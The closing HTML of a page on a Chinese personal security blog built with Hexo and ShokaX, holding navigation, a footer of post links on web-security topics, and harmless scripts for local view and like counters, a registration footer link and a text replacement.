title="https:&#x2F;&#x2F;github.com&#x2F;ZLARYY123"><i class="ic i-github"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>友链</a></li><li class="item"><a href="/essay/" rel="section"><i class="ic i-calendar"></i>essay</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2026/05/29/%E5%85%B6%E4%BB%96%E7%B3%BB%E7%BB%9F%E5%BA%93%E7%B1%BB%E5%9E%8B%E4%B8%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div><div id="player"></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"></div><span><a href="/2026/02/22/SQL/">SQL</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/06/18/SQL%E6%8F%90%E6%9D%83/">未命名</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/04/23/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">信息搜集</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/04/02/flask%20session%E4%BC%AA%E9%80%A0%E4%B8%8Efilter-chain/">flask的session伪造与filter-chain</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/03/20/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EPython%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">Pickle反序列化与Python原型链污染</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/04/07/XXE/">XXE</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/02/12/SSRF/">SSRF</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/02/28/RCE/">RCE</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/">低版本php下信息泄露的CVE漏洞与反弹shell</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/03/27/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">沙箱逃逸</a></span></li></ul></div><div class="rpost pjax"><h2>最新评论</h2></div></div><div class="status"><div class="copyright">&copy; 2022 -<span itemprop="copyrightYear">2026</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">ZLARYY @ ZLARYY</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">345k 字</span><span class="post-meta-divider"> | </span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">5:14</span></div><div class="powered-by">基于 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & Theme.<a target="_blank" rel="noopener" href="https://github.com/theme-shoka-x/hexo-theme-shokaX/">ShokaX</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
+    ispost: true,
+    path: `2026/06/18/SQL提权/`,
+    favicon: {
+        show: `ZLARYY`,
+        hide: `ZLARYY`
+    },
+    search: {
+        placeholder: "文章搜索",
+        empty: "关于 「 ${query} 」，什么也没搜到",
+        stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    nocopy: "false",
+    copyright: `复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。`,
+    copy_tex: false,
+    katex: false,
+    mermaid: false,
+    audio: undefined,
+    nocopy: false,
+    outime: true,
+    template: `<div class="note warning"><p><span class="label warning">文章时效性提示</span><br>这是一篇发布于 {{publish}} 天前，最后一次更新在 {{updated}} 天前的文章，部分信息可能已经发生改变，请注意甄别。</p></div>`,
+    quiz: {
+        choice: `单选题`,
+        multiple: `多选题`,
+        true_false: `判断题`,
+        essay: `问答题`,
+        gap_fill: `填空题`,
+        mistake: `错题备注`
+    }
+};
+</script><script src="/js/siteInit.js?v=0.5.4" type="module" fetchpriority="high" defer></script><!-- hexo injector body_end start -->
+<script id="post-stats">
+(function () {
+  var API_NAME = 'ZLARYYPostStats';
+  var BOX_SELECTOR = '.post-stats-box';
+  var COUNT_LIMIT = 9999;
+
+  if (window[API_NAME] && typeof window[API_NAME].run === 'function') {
+    window[API_NAME].run();
+    return;
+  }
+
+  function isPostPage() {
+    return !!(window.LOCAL && window.LOCAL.ispost) || !!document.querySelector('article.post');
+  }
+
+  function storageKey(prefix) {
+    return prefix + window.location.pathname;
+  }
+
+  function getStorageValue(storage, key) {
+    try {
+      return storage.getItem(key);
+    } catch (error) {
+      return null;
+    }
+  }
+
+  function setStorageValue(storage, key, value) {
+    try {
+      storage.setItem(key, value);
+    } catch (error) {}
+  }
+
+  function removeStorageValue(storage, key) {
+    try {
+      storage.removeItem(key);
+    } catch (error) {}
+  }
+
+  function readCount(key) {
+    var raw = getStorageValue(window.localStorage, key);
+    var value = raw === null || raw === '' ? 0 : Number(raw);
+
+    if (!Number.isInteger(value) || value < 0 || value > COUNT_LIMIT) {
+      value = 0;
+      setStorageValue(window.localStorage, key, '0');
+    }
+
+    return value;
+  }
+
+  function writeCount(key, value) {
+    setStorageValue(window.localStorage, key, String(value));
+  }
+
+  function bumpViewCount() {
+    var countKey = storageKey('zlaryy_view_count_');
+    var sessionKey = storageKey('zlaryy_viewed_session_');
+    var count = readCount(countKey);
+
+    if (getStorageValue(window.sessionStorage, sessionKey) !== '1') {
+      if (count >= COUNT_LIMIT) count = 0;
+      count += 1;
+      writeCount(countKey, count);
+      setStorageValue(window.sessionStorage, sessionKey, '1');
+    }
+
+    return count;
+  }
+
+  function readLikeCount() {
+    return readCount(storageKey('zlaryy_like_count_'));
+  }
+
+  function hasLiked() {
+    return getStorageValue(window.localStorage, storageKey('zlaryy_liked_')) === '1';
+  }
+
+  function saveLikeState(count, liked) {
+    writeCount(storageKey('zlaryy_like_count_'), count);
+    if (liked) {
+      setStorageValue(window.localStorage, storageKey('zlaryy_liked_'), '1');
+    } else {
+      removeStorageValue(window.localStorage, storageKey('zlaryy_liked_'));
+    }
+  }
+
+  function clearRewardNodes() {
+    document.querySelectorAll('.reward').forEach(function (reward) {
+      reward.innerHTML = '';
+      reward.classList.add('post-stats-host');
+      reward.removeAttribute('style');
+      reward.setAttribute('aria-label', 'post stats');
+    });
+  }
+
+  function findInsertTarget() {
+    var reward = document.querySelector('article.post .reward, .reward');
+    if (reward) return { parent: reward, before: null };
+
+    var footer = document.querySelector('article.post > footer');
+    if (footer && footer.parentNode) return { parent: footer.parentNode, before: footer };
+
+    var article = document.querySelector('article.post');
+    if (article) return { parent: article, before: null };
+
+    return null;
+  }
+
+  function createStatsBox(viewCount, likeCount, liked) {
+    var box = document.createElement('div');
+    box.className = 'post-stats-box';
+    box.innerHTML = [
+      '<button class="post-view-count" type="button" disabled aria-disabled="true">',
+      '&#128065; &#x770b;&#x8fc7; <span class="local-view-count">' + viewCount + '</span> &#x6b21;',
+      '</button>',
+      '<button class="post-like-btn' + (liked ? ' liked' : '') + '" type="button" aria-pressed="' + (liked ? 'true' : 'false') + '">',
+      '<span class="post-like-label">' + (liked ? '&#x5df2;&#x70b9;&#x8d5e;' : '&#x70b9;&#x8d5e;') + '</span> ',
+      '<span class="local-like-count">' + likeCount + '</span>',
+      '</button>'
+    ].join('');
+
+    return box;
+  }
+
+  function updateLikeButton(button, count, liked) {
+    var labelNode = button.querySelector('.post-like-label');
+    var countNode = button.querySelector('.local-like-count');
+
+    if (labelNode) labelNode.textContent = liked ? '\u5df2\u70b9\u8d5e' : '\u70b9\u8d5e';
+    if (countNode) countNode.textContent = String(count);
+
+    button.classList.toggle('liked', liked);
+    button.setAttribute('aria-pressed', liked ? 'true' : 'false');
+  }
+
+  function bindLikeButton(box) {
+    var button = box.querySelector('.post-like-btn');
+    if (!button || button.dataset.bound === 'true') return;
+
+    updateLikeButton(button, readLikeCount(), hasLiked());
+
+    button.dataset.bound = 'true';
+    button.addEventListener('click', function () {
+      var count = readLikeCount();
+
+      if (hasLiked()) {
+        count = Math.max(0, count - 1);
+        saveLikeState(count, false);
+        updateLikeButton(button, count, false);
+        return;
+      }
+
+      if (count >= COUNT_LIMIT) count = 0;
+      count += 1;
+      saveLikeState(count, true);
+      updateLikeButton(button, count, true);
+    });
+  }
+
+  function renderStats() {
+    if (!isPostPage()) return;
+
+    clearRewardNodes();
+
+    var viewCount = bumpViewCount();
+    var likeCount = readLikeCount();
+    var liked = hasLiked();
+    var box = document.querySelector(BOX_SELECTOR);
+
+    if (!box) {
+      var target = findInsertTarget();
+      if (!target) return;
+
+      box = createStatsBox(viewCount, likeCount, liked);
+      target.parent.insertBefore(box, target.before);
+    }
+
+    var viewNode = box.querySelector('.local-view-count');
+    var likeNode = box.querySelector('.local-like-count');
+    var likeButton = box.querySelector('.post-like-btn');
+
+    if (viewNode) viewNode.textContent = String(viewCount);
+    if (likeNode) likeNode.textContent = String(likeCount);
+    if (likeButton) {
+      updateLikeButton(likeButton, likeCount, liked);
+    }
+
+    bindLikeButton(box);
+  }
+
+  function runPostStats() {
+    window.setTimeout(renderStats, 0);
+  }
+
+  window[API_NAME] = {
+    run: runPostStats
+  };
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', runPostStats);
+  } else {
+    runPostStats();
+  }
+
+  document.addEventListener('pjax:complete', runPostStats);
+})();
+</script>
+  
+<script>
+(function () {
+  function addBeian() {
+    const footerStatus = document.querySelector('#footer .status');
+    if (!footerStatus) return;
+
+    if (document.querySelector('.footer-beian')) return;
+
+    const beian = document.createElement('div');
+    beian.className = 'footer-beian';
+    beian.innerHTML = '<a href="https://beian.miit.gov.cn/" target="_blank" rel="noopener">蜀ICP备2026016552号-1</a>';
+
+    footerStatus.appendChild(beian);
+  }
+
+  addBeian();
+  document.addEventListener('pjax:complete', addBeian);
+})();
+</script>
+  <script>
+(function () {
+  function fixText(text) {
+    if (!text) return text;
+    text = text.replace(/\([`´]?Д[`´]?\)大変だ!/g, "ZLARYY");
+    text = text.replace(/大変だ!/g, "ZLARYY");
+    return text;
+  }
+
+  function replaceText(root) {
+    root = root || document.body;
+    if (!root) return;
+
+    var walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT, null, false);
+    var node;
+
+    while ((node = walker.nextNode())) {
+      var oldText = node.nodeValue;
+      var newText = fixText(oldText);
+      if (newText !== oldText) node.nodeValue = newText;
+    }
+  }
+
+  function init() {
+    replaceText(document.body);
+
+    var observer = new MutationObserver(function (mutations) {
+      mutations.forEach(function (mutation) {
+        mutation.addedNodes.forEach(function (node) {
+          if (node.nodeType === 1) {
+            replaceText(node);
+          } else if (node.nodeType === 3) {
+            node.nodeValue = fixText(node.nodeValue);
+          }
+        });
+      });
+    });
+
+    observer.observe(document.body, {
+      childList: true,
+      subtree: true
+    });
+  }
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", init);
+  } else {
+    init();
+  }
+})();
+</script><!-- hexo injector body_end end --></body></html>
